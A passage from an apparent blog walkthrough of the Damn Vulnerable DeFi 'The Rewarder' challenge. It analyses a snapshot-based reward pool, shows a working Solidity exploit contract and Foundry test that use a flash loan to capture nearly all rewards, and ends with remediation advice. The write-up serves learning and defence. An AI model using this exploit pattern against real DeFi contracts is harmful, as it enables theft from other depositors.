<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ReentrancyGuard</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">Address</span> <span style="color:#728e00">for</span> <span style="color:#00979d">address</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">liquidityToken</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">error</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">liquidityTokenAddress</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span> <span style="color:#728e00">=</span> <span style="color:#434f54">DamnValuableToken</span>(<span style="color:#434f54">liquidityTokenAddress</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">isContract</span>()) <span style="color:#728e00">revert</span> <span style="color:#434f54">BorrowerMustBeAContract</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#434f54">functionCall</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;receiveFlashLoan(uint256)&#34;</span>, <span style="color:#434f54">amount</span>)
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>)) <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="therewarderpool">
  TheRewarderPool
  <a class="heading-link" href="#therewarderpool">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Let&rsquo;s examine public/external functions of this contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">deposit</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToDeposit</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountToDeposit</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustDepositTokens</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToDeposit</span>); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#434f54">transferFrom</span>(
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>),
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">amountToDeposit</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    ) <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Requires the deposit to be greater than zero.</li>
<li>Mints an amount of rTKN&rsquo;s equal to the amount of deposited DVT&rsquo;s. These
rTKN&rsquo;s would be burned on withdrawal.</li>
<li>Calls the <code>distributeRewards</code>, which creates a new snapshot of
the deposited DVT&rsquo;s for each round and distributes the rewards.</li>
<li>Transfers the <code>amountOfDeposit</code> of DVT tokens from <code>msg.sender</code> to this contract.</li>
</ul>
<p>The <code>withdraw</code> function does two things:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amountToWithdraw</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">accToken</span>.<span style="color:#434f54">burn</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">liquidityToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">amountToWithdraw</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFail</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Burns the <code>amountToWithdraw</code> rTKN tokens.</li>
<li>Transfers DVT tokens to the caller account.</li>
</ul>
<p>Now, let&rsquo;s review the most interesting function in this contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">distributeRewards</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">isNewRewardsRound</span>()) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">_recordSnapshot</span>();
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">totalSupplyAt</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">=</span> <span style="color:#434f54">accToken</span>.<span style="color:#434f54">balanceOfAt</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">lastSnapshotIdForRewards</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">totalDeposits</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewards</span> <span style="color:#728e00">=</span> (<span style="color:#434f54">amountDeposited</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">100</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>) <span style="color:#728e00">/</span> <span style="color:#434f54">totalDeposits</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">rewards</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#728e00">!</span><span style="color:#434f54">_hasRetrievedReward</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#434f54">rewardToken</span>.<span style="color:#434f54">mint</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">rewards</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">lastRewardTimestamps</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#434f54">rewards</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It uses snapshots to calculate the rewards. Users get their
rewards dependent on the amount deposited vs total deposits in
the current round:</p>
<p>\( \dfrac{amountDeposited × 100 × 10^{18}}{totalDeposits × 10^{18}} \)</p>
<p>To get the most reward tokens in the next
round we should deposit so many DVT&rsquo;s that the rewards for other
users will be negligible. If we take a flash loan and deposit \(
1000000 \) DVT&rsquo;s then our share will be so big that other users
will get \( 0 \) RWT&rsquo;s due to integer division rounding.</p>
<p>We can calculate the amount of reward tokens we&rsquo;ll get:</p>
<p>\( \dfrac{1000000 × 100 × 10^{18}}{(1000000 + 4 \times 100) × 10^{18}} =
\dfrac{100000000}{1000400} ≈ 99.96 \)</p>
<p>Now let&rsquo;s calculate the amount of RWT&rsquo;s for each user who deposited \(
100 \) DVT&rsquo;s:</p>
<p>\( \dfrac{100 × 100 × 10^{18}}{(1000000 + 4 \times 100) × 10^{18}} =
\dfrac{10000}{1000400} = 0 \) (because of
<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/"  class="external-link" target="_blank" rel="noopener">integer
division</a>)</p>
<h2 id="solution">
  Solution
  <a class="heading-link" href="#solution">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The <code>deposit</code> function immediately distributes the rewards.
Hence we have to get ahead of everyone and be the first with our
deposit in a new round. The <code>distributeRewards</code> uses the
snapshot to get the <code>totalDeposits</code> so we can withdraw the
deposited DVT&rsquo;s right away. Then we pay back the flash loan and
transfer all the rewards to the <code>owner</code> (attacker):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Exploit</span> <span style="color:#728e00">is</span> <span style="color:#434f54">DSTest</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">TheRewarderPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rewarder</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">flashLoaner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">DamnValuableToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">dvt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">RewardToken</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">rwt</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">TheRewarderPool</span> <span style="color:#434f54">_rewarder</span>, <span style="color:#434f54">FlashLoanerPool</span> <span style="color:#434f54">_flashLoaner</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rewarder</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">flashLoaner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_flashLoaner</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">liquidityToken</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rwt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">rewardToken</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>));
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">flashLoaner</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">receiveFlashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">rewarder</span>), <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>), <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rwt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rwt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">owner</span>, <span style="color:#434f54">rewardBalance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can use the <a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples"  class="external-link" target="_blank" rel="noopener">vm.warp</a>
to set the <code>block.timestamp</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// wait for the next round
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">new</span> <span style="color:#434f54">Exploit</span>(<span style="color:#434f54">theRewarderPool</span>, <span style="color:#434f54">flashLoanerPool</span>).<span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And we passed the challenge! The forge&rsquo;s trace is too large to include
it right here %)</p>
<p>Maybe
<a href="https://gist.github.com/vyorkin/89b3d301e49990041a933068034fc7e6"  class="external-link" target="_blank" rel="noopener">this
sequence diagram</a> can help visualizing the interactions between
contracts.</p>
<h2 id="remediation">
  Remediation
  <a class="heading-link" href="#remediation">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="get-rid-of-snapshots-and-rounds">
  Get rid of snapshots and rounds
  <a class="heading-link" href="#get-rid-of-snapshots-and-rounds">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Don&rsquo;t distribute rewards right after the deposit. Implement
something like
<a href="https://solidity-by-example.org/defi/staking-rewards/"  class="external-link" target="_blank" rel="noopener">Staking
Rewards</a> to reward users for staking their token instead of
relying on snapshots and rounds.</p>
<h3 id="multiply-before-dividing">
  Multiply before dividing
  <a class="heading-link" href="#multiply-before-dividing">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Use the \( 10^{16} \) multiplier to fix the integer division rounding errors:</p>
<p>\( \dfrac{amountDeposited × 100 × 10^{36}}{totalDeposits × 10^{18}} \)</p>
<p>Now let&rsquo;s calculate how much users would get if we
used the above formula with multipliers:</p>
<p>\( \dfrac{100 × 100 × 10^{36}}{(1000000 + 4 \times 100) × 10^{18}} = \dfrac{10000 × 10^{18}}{1000400} = 9.9960016e+15 \)</p>
<p>This multiplier needs to be accounted for when working with the
result in the future.</p>
<h2 id="references">
  References
  <a class="heading-link" href="#references">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<ul>
<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
&ndash; Extends an ERC20 token with a snapshot mechanism.</li>
<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl"  class="external-link" target="_blank" rel="noopener">AccessControl</a>
&ndash; Allows children to implement role-based access control mechanisms.</li>
<li><a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/"  class="external-link" target="_blank" rel="noopener">Integer
Division</a> from Ethereum Smart Contract Best Practices.</li>
<li><a href="https://medium.com/@soliditydeveloper.com/solidity-design-patterns-multiply-before-dividing-407980646f7"  class="external-link" target="_blank" rel="noopener">Solidity Design Patterns: Multiply before Dividing</a>.</li>
<li><a href="https://solidity-by-example.org/defi/staking-rewards/"  class="external-link" target="_blank" rel="noopener">Staking
Rewards</a> &ndash; A minimal example of a contract that rewards
users for staking their token from <a href="https://solidity-by-example.org/"  class="external-link" target="_blank" rel="noopener">Solidity by Example</a>.</li>
</ul>
<hr>
<p>The solution/exploit code is <a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/the-rewarder/TheRewarder.t.sol#L15-L44"  class="external-link" target="_blank" rel="noopener">here</a>.
This one was a bit trickier! Let&rsquo;s see whats next &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-6-selfie" >#6 Selfie</a>.</p>

        
      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      1985 -
    
    2024
     Vasiliy Yorkin 
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://vyorkin.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  
    
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-F8R77TYF8B');
        }
      </script>
    
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
